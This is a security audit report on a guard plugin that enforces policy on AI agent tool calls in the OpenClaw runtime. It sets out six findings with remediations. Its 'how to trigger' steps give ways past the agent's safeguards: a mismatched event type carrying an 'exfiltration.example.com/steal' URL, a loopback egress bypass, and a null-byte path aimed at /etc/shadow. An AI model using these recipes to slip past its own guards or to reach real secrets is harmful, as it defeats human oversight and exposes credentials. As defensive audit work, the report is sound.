# OpenClaw Launch Security Audit (2026-02-25)

> Historical snapshot (2026-02-25).  
> Current branch status is tracked in [`2026-02-26-openclaw-launch-revalidation.md`](./2026-02-26-openclaw-launch-revalidation.md) and runtime evidence in [`../reports/2026-02-26-openclaw-runtime-compatibility-validation.md`](../reports/2026-02-26-openclaw-runtime-compatibility-validation.md).

## Executive Summary

Point-in-time security audit of the `feat/clawdstrike-sdks-launch` branch, conducted as part of the OpenClaw adapter launch readiness review. The audit identified **6 security findings**: 3 high-severity, 2 medium-severity, and 1 low-severity. Two high-severity findings (S1, S2) are directly exploitable guard bypasses that should be resolved before merge. Two findings (S4, S5) require verification against the live OpenClaw runtime and may represent complete enforcement bypass if confirmed. The remaining findings are defense-in-depth improvements.

## Methodology

8-agent parallel research covering the following domains:

1. OpenClaw documentation and public plugin API surface
2. Plugin hook registration and event lifecycle
3. Rust agent integration (`apps/agent/src-tauri/src/openclaw/`)
4. Policy engine and deterministic guard evaluation (`packages/adapters/clawdstrike-openclaw/src/policy/`)
5. Individual guard implementations (egress, forbidden-path, secret-leak, patch-integrity, MCP tool)
6. Desktop integration and identity management
7. Cross-adapter patterns and shared abstractions (`clawdstrike-adapter-core`)
8. SDK changes, test coverage, and CI pipeline

Validation performed in this branch:

1. Static review of all adapter source files in `packages/adapters/clawdstrike-openclaw/src/`.
2. Cross-reference of hook event names against OpenClaw v2026.2.x documentation and community PRs.
3. Ruleset review of `rulesets/ai-agent.yaml` and `rulesets/ai-agent-minimal.yaml` for address coverage gaps.
4. Review of Rust agent key material handling in `apps/agent/src-tauri/src/openclaw/manager.rs`.

## Findings

### S1 — Egress Guard Bypass via Unprotected Addresses [HIGH]

Severity: High
Location: `packages/adapters/clawdstrike-openclaw/src/guards/egress.ts:14-36`, `rulesets/ai-agent.yaml`, `rulesets/ai-agent-minimal.yaml`
Category: security invariant

**Description:** The `DEFAULT_DENIED_DOMAINS` list in the egress guard and the corresponding deny entries in both `ai-agent` rulesets are missing coverage for several address families that resolve to local or private network targets:

- `0.0.0.0` (unspecified address, commonly resolves to localhost on many platforms)
- `::1` (IPv6 loopback)
- `169.254.*` (RFC 3927 link-local addresses)
- `fe80:*` (IPv6 link-local)
- `fc00:*`, `fd*` (IPv6 unique local addresses, RFC 4193)

An attacker can bypass the egress allowlist by specifying any of these as the target host in a network action event.

**Impact:** Network egress policy can be completely circumvented for local and private network targets. This undermines the core security guarantee of the egress guard.

**How to trigger:** Submit a tool call event with `data.type: "network"` and `data.url: "http://[::1]:8080/internal-api"`. The egress guard checks against `DEFAULT_DENIED_DOMAINS` and the policy deny list; neither contains `::1`, so the request is allowed.

**Remediation:** Add these address patterns to `DEFAULT_DENIED_DOMAINS` in `egress.ts` and to the deny lists in both `ai-agent.yaml` and `ai-agent-minimal.yaml`. Consider implementing CIDR range matching for comprehensive coverage rather than pattern-based string matching.

**Status:** Open

---

### S2 — Event Type / Data Type Consistency Not Validated [HIGH]

Severity: High
Location: `packages/adapters/clawdstrike-openclaw/src/policy/engine.ts:294-322`
Category: security invariant

**Description:** The policy engine dispatches guard evaluation based on the `eventType` field (e.g., `file_write`), but each individual guard independently checks `data.type` (e.g., `file`) to decide whether it applies. There is no validation that these two fields are consistent with each other.

If a crafted event is submitted with `eventType: "file_write"` but `data.type: "network"`, the engine dispatches to the file-write evaluation path. However, `ForbiddenPathGuard` returns `allow` because `data.type !== 'file'`, and the network-related guards are never invoked because the engine routed through the file-write path. The event passes all checks unchallenged.

**Impact:** All guards can be bypassed by mismatching `eventType` and `data.type`. This is the highest-impact finding in this audit because it affects every guard uniformly.

**How to trigger:** Submit an event with `eventType: "file_write"` and `data: { type: "network", url: "http://exfiltration.example.com/steal", ... }`. The engine dispatches to file-write guards, which all return `allow` because `data.type` is not `file`. No network guard is consulted.

**Remediation:** Add a consistency check at the top of `evaluateDeterministic()` that validates the expected `data.type` for each `eventType`. Deny events with mismatched types immediately before guard evaluation proceeds.

**Status:** Open

---

### S3 — Null Byte Path Injection [MEDIUM]

Severity: Medium
Location: `packages/adapters/clawdstrike-openclaw/src/guards/forbidden-path.ts:55-78`
Category: security invariant

**Description:** The forbidden-path guard does not sanitize null bytes (`\0`) in incoming event data paths. A path like `/etc/shadow\0.txt` could bypass pattern matching (the guard sees the full string including `.txt` and may not match a pattern for `/etc/shadow`), while the underlying OS truncates at the null byte and operates on `/etc/shadow`.

The policy YAML validator does check for null bytes in policy file content (`validator.ts:112-114`), but event data paths received at runtime are not subject to this validation.

**Impact:** Possible forbidden-path bypass on platforms where null bytes truncate filenames in system calls. The practical exploitability depends on the runtime environment and OS behavior.

**How to trigger:** Submit an event with `data.path: "/etc/shadow\0.txt"`. The forbidden-path guard evaluates the full string `/etc/shadow\0.txt` against its patterns. If the pattern is `/etc/shadow`, the match may fail due to the trailing `\0.txt`. The OS-level file operation would target `/etc/shadow`.

**Remediation:** Strip or reject null bytes in `normalizePath()` before pattern matching. Rejecting (deny) is preferred over stripping for fail-closed semantics.

**Status:** Open

---

### S4 — Hook Event Name May Not Match OpenClaw API [HIGH]

Severity: High
Location: `packages/adapters/clawdstrike-openclaw/src/plugin.ts:174-175`
Category: integration correctness

**Description:** The Clawdstrike plugin registers hooks for the event name `'tool_call'`. However, OpenClaw's official documentation (since v2026.2.1, wired in upstream PRs #6570 and #6660) names the pre-execution hook `'before_tool_call'`. If these are different event names and not aliases, the preflight security hook never fires. All tool calls would proceed without any policy evaluation.

**Impact:** Complete bypass of tool-level security enforcement. No guard is ever consulted, no receipt is ever generated. This is a silent failure: no error is raised, and the plugin appears to load successfully.

**How to trigger:** Install the plugin in an OpenClaw runtime that uses `'before_tool_call'` as the hook event name. Observe that no preflight handler fires on tool invocations.

**Remediation:** Verify against the current OpenClaw source and runtime which event name is correct. Defensively register both `'tool_call'` and `'before_tool_call'`, or confirm via OpenClaw maintainers that `'tool_call'` is a supported alias.

**Status:** Open -- requires runtime verification

---

### S5 — `preventDefault` Blocking Mechanism Undocumented [MEDIUM]

Severity: Medium
Location: `packages/adapters/clawdstrike-openclaw/src/types.ts:536`, all hook handlers
Category: integration correctness

**Description:** The Clawdstrike plugin blocks tool execution by setting `event.preventDefault = true` on the `ToolCallEvent` object. This mutation-based blocking mechanism is not documented in OpenClaw's official plugin API. Community proposals (visible in OpenClaw Issues #10502, #1733) suggest a return-value-based blocking pattern (`{ action: 'block', reason: '...' }`) rather than event mutation.

If the OpenClaw runtime does not honor the `preventDefault` field, tool blocking is silently broken: the guard evaluates correctly and logs a deny decision, but the tool call proceeds anyway.

**Impact:** Security enforcement may silently fail if the blocking mechanism is not supported by the runtime. The audit log would show denials, but the denied actions would still execute.

**How to trigger:** Run the plugin in an OpenClaw runtime that does not honor `preventDefault` on hook events. Trigger a tool call that should be denied by policy. Observe that the deny receipt is generated but the tool call executes regardless.

**Remediation:** Test against the current OpenClaw v2026.2.x runtime to confirm `preventDefault` behavior. Investigate whether `before_tool_call` hooks support a return-value blocking pattern. Consider supporting both mechanisms for forward compatibility.

**Status:** Open -- requires runtime verification

---

### S6 — Private Key PEM Not Zeroized in Memory [LOW]

Severity: Low
Location: `apps/agent/src-tauri/src/openclaw/manager.rs:870-874`
Category: defense in depth

**Description:** The Ed25519 private key PEM is stored as a plain Rust `String` in the `OpenClawDeviceIdentity` struct. While `ed25519-dalek::SigningKey` implements `Zeroize` (and is zeroized on drop), the PEM string representation of the key material is not zeroized when the struct is dropped. An attacker with memory-read access (via core dump, cold boot attack, or memory-safety exploit in another component) could recover the key material from the PEM string.

**Impact:** Defense-in-depth concern for key material handling. Exploitation requires an attacker who already has memory-read access to the agent process, which limits practical exploitability.

**Remediation:** Use `secrecy::SecretString` or `zeroize::Zeroizing<String>` for the `private_key_pem` field in `OpenClawDeviceIdentity`. Both crates are already transitive dependencies via `ed25519-dalek`.

**Status:** Open

## Risk Matrix

| ID | Severity | Exploitability | Impact | CVSS Est. |
|----|----------|----------------|--------|-----------|
| S1 | High | Easy | Egress bypass for local/private targets | 7.5 |
| S2 | High | Moderate | Full guard bypass via type mismatch | 8.1 |
| S3 | Medium | Moderate | Path guard bypass via null byte injection | 5.3 |
| S4 | High | N/A (config) | Complete enforcement bypass if event name wrong | 9.1 |
| S5 | Medium | N/A (runtime) | Silent enforcement bypass if preventDefault unsupported | 7.0 |
| S6 | Low | Hard | Key material exposure from memory | 3.2 |

## Recommendations

1. **Before merge:** Fix S1 (egress address coverage) and S2 (eventType/data.type consistency check). These are directly exploitable guard bypasses with straightforward fixes.
2. **Before merge:** Verify S4 (hook event name) and S5 (preventDefault mechanism) against a live OpenClaw v2026.2.x runtime. If either is confirmed broken, fix before merge.
3. **Fast follow:** Fix S3 (null byte sanitization in normalizePath) and S6 (PEM zeroization).
4. **Ongoing:** Monitor OpenClaw hook API evolution. Relevant upstream tracking: OpenClaw Issues #10502, #1733, #19072.
